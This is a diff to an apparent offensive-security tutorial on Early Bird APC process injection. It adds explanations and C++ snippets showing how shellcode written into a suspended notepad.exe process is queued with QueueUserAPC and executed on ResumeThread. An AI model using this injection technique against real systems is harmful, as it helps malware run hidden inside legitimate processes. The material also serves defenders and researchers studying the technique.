@@ -62,13 +62,15 @@ BOOL CreateProcessA(
 - **LPPROCESS_INFORMATION lpProcessInformation**: A pointer to the PROCESS_INFORMATION structure, which contains the handles to the process and threads.
 
 
-
 ### CreateProcess
 ```c++
 // CreateProcess Variables
-STARTUPINFO si = { 0 };
-PROCESS_INFORMATION pi = { 0 };
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+
+ZeroMemory( &si, sizeof(si) );
 si.cb = sizeof(si);
+ZeroMemory( &pi, sizeof(pi) );
 
 LPCWSTR execFile = L"C:\\Windows\\notepad.exe";
    
@@ -146,6 +148,23 @@ printf("successfully executed virtual protect");
 ```
 
 ### QueueUserAPC
+So until now, we have our process/thread in a suspended state, handles to the thread and process, allocation of virtual address, and shellcode written into the memory space. Now we need to add an Asynchronous Procedure Call (APC) object to the APC queue of the specified thread. Each thread in the process contains a queue of these APCs. In this scenario, the function `QueueUserAPC` can be used to queue the thread that contains our malicious shellcode, so when the process is in an alertable state, rather than executing the main thread, the thread that contains the shellcode will be executed.
+
+
+```c++
+DWORD QueueUserAPC(
+  [in] PAPCFUNC  pfnAPC,
+  [in] HANDLE    hThread,
+  [in] ULONG_PTR dwData
+);
+```
+
+It contains three arguments which are as follows:
+- **PAPCFUNC pfnAPC**: It provides a pointer to the APC function. In our case, `lpAlloc` is the function that we need to execute when the process is in an alertable state or when the thread is resumed. `lpAlloc` is a pointer to the allocated memory for our shellcode.
+- **HANDLE hThread**: A handle to the thread to which the APC will be queued.
+- **ULONG_PTR dwData**: A variable that will be passed to the APC function when executed. Since we do not need to pass any additional parameter to the function, it can be configured as `NULL`.
+
+
 ```c++
 DWORD dQueueAPC = QueueUserAPC((PAPCFUNC) lpAlloc, pi.hThread, NULL);
 if (dQueueAPC == 0) {
@@ -156,6 +175,15 @@ Sleep(1000 * 2);
 ```
 
 ### ResumeThread
+Now, once we have our APC function queued on our thread, the next step is to use the **ResumeThread** function to change the state of the thread from the suspended state to the alertable state. Once the thread is resumed, it will resume from the queue of the APC that we have defined, which is our shellcode address.
+
+It contains a single parameter which is a handle to the thread that needs to be restarted.
+```c++
+DWORD ResumeThread(
+  [in] HANDLE hThread
+);
+```
+
 ```c++
 // ResumeThread
 DWORD dResumeThread = ResumeThread(pi.hThread);
@@ -167,6 +195,7 @@ printf("Executing the shellcode");
 ```
 
 ### CloseHandle
+It's better to close the handles to your threads and process once the execution is done.
 ```c++
     // Close handles
     CloseHandle(pi.hThread);
@@ -183,3 +212,6 @@ printf("Executing the shellcode");
 - [http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1](http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1)
 - [https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection)
 - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
+- [https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-processes)
+- [https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb](https://posts.specterops.io/the-curious-case-of-queueuserapc-3f62e966d2cb)
+- [https://stackoverflow.com/questions/8551004/when-to-use-queueuserapc](https://stackoverflow.com/questions/8551004/when-to-use-queueuserapc)
